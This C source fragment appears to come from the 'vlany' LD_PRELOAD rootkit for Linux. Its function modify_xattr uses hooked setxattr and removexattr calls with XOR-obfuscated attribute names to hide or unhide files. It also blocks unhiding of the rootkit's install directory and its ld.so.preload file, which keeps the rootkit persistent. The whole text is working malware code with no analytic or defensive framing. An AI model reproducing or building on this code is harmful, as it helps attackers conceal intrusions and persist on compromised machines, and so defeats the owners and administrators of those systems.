int modify_xattr(const char *path, int mode)
{
    #ifdef DEBUG
        printf("[vlany] attempting to modify file %s\n", path);
    #endif

    if(mode != 1 && mode != 2) return -1; // invalid mode

    if(mode == 1) // hide file
    {
        #ifdef DEBUG
            printf("[vlany] hiding file %s\n", path);
        #endif

        char xattr_user[256];
        char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
        char *hidden_xattr_2_str = strdup(HIDDEN_XATTR_2_STR); xor(hidden_xattr_2_str);
        char *xattr = strdup(XATTR); xor(xattr);

        snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str);
        CLEAN(xattr); CLEAN(hidden_xattr_1_str);

        HOOK(old_setxattr, CSETXATTR);
        int ret = old_setxattr(path, xattr_user, hidden_xattr_2_str, strlen(hidden_xattr_2_str), XATTR_CREATE);
        CLEAN(hidden_xattr_2_str);

        return ret;
    }

    if(mode == 2) // unhide file
    {
        #ifdef DEBUG
            printf("[vlany] unhiding file %s\n", path);
        #endif

        // prevent removal of install dir or new ld.so.preload
        char *install = strdup(INSTALL); xor(install);
        char *ld_preload_etc = strdup(LD_PRELOAD_ETC); xor(ld_preload_etc);
        if(strstr(path, install) || strstr(path, ld_preload_etc)) { CLEAN(install); CLEAN(ld_preload_etc); return -1; }
        CLEAN(ld_preload_etc); CLEAN(install);

        char xattr_user[256];
        char *xattr = strdup(XATTR); xor(xattr);
        char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);

        snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str);
        CLEAN(xattr); CLEAN(hidden_xattr_1_str);

        HOOK(old_removexattr, CREMOVEXATTR);
        int ret = old_removexattr(path, xattr_user);

        return ret;
    }

    return -1; // nothing was accomplished
}
